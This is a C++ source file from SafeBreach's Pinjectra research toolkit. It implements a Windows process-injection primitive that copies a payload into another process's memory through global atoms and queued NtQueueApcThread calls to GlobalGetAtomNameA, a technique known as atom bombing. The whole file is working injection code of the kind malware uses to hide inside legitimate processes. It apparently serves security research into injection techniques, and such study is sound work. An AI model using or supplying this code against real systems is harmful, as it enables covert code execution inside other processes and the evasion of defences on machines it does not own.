// Copyright (c) 2019, SafeBreach
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
//  * Redistributions of source code must retain the above copyright notice,
//    this list of conditions and the following disclaimer.
//  * Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
//  * Neither the name of the copyright holder nor the names of its
//    contributors may be used to endorse or promote products derived from
//    this software without specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.

// AUTHORS: Amit Klein, Itzik Kotler
// SEE: https://github.com/SafeBreach-Labs/Pinjectra

#include "OT_OP_VAE_GAAA.h"

OpenThread_OpenProcess_VirtualAllocEx_GlobalAddAtomA::~OpenThread_OpenProcess_VirtualAllocEx_GlobalAddAtomA()
{
}

NTSTATUS(NTAPI* pNtQueueApcThread)(
	_In_ HANDLE ThreadHandle,
	_In_ PVOID ApcRoutine,
	_In_ PVOID ApcRoutineContext OPTIONAL,
	_In_ PVOID ApcStatusBlock OPTIONAL,
	_In_ PVOID ApcReserved OPTIONAL
	);

RUNTIME_MEM_ENTRY* OpenThread_OpenProcess_VirtualAllocEx_GlobalAddAtomA::write(DWORD pid, DWORD tid)
{
	HANDLE th;
	DWORD process_id;
	LPVOID target_payload;
	RUNTIME_MEM_ENTRY* ret_entry;
	char* payload = (char *)this->m_buf;

	pNtQueueApcThread = (NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, PVOID, PVOID)) GetProcAddress(GetModuleHandleA("ntdll"), "NtQueueApcThread");

	th = OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, tid);
	if (th == NULL)
		return NULL;

	process_id = GetProcessIdOfThread(th);
	HANDLE p = OpenProcess(this->m_OpenProcess_dwDesiredAccess, FALSE, process_id);
	if (p == NULL)
		return NULL;

	target_payload = VirtualAllocEx(p, NULL, this->m_nbyte, this->m_VirtualAllocEx_flAllocationType, this->m_VirtualAllocEx_flProtect); //MEM_COMMIT guarantees 0's.
	if (target_payload == NULL)
		return NULL;

	CloseHandle(p);

	ATOM b = GlobalAddAtomA("b"); // arbitrary one char string
	if (b == 0)
		return NULL;

	if (payload[0] == '\0')
		return NULL;

	for (DWORD64 pos = this->m_nbyte - 1; pos > 0; pos--)
	{
		if ((payload[pos] == '\0') && (payload[pos - 1] == '\0'))
		{
			(*pNtQueueApcThread)(th, GlobalGetAtomNameA, (PVOID)b, (PVOID)(((DWORD64)target_payload) + pos - 1), (PVOID)2);
		}
	}

	for (char* pos = payload; pos < (payload + this->m_nbyte); pos += strlen(pos) + 1)
	{
		if (*pos == '\0')
			continue;

		ATOM a = GlobalAddAtomA(pos);
		if (a == 0)
			return NULL;

		DWORD64 offset = pos - payload;
		(*pNtQueueApcThread)(th, GlobalGetAtomNameA, (PVOID)a, (PVOID)(((DWORD64)target_payload) + offset), (PVOID)(strlen(pos) + 1));
	}

	// Fill in
	ret_entry = (RUNTIME_MEM_ENTRY*)malloc(sizeof(RUNTIME_MEM_ENTRY));

	if (ret_entry == NULL)
		return NULL;

	ret_entry->thread = th;
	ret_entry->process = NULL;
	ret_entry->addr = target_payload;
	ret_entry->entry_point = target_payload;

	return ret_entry;
}

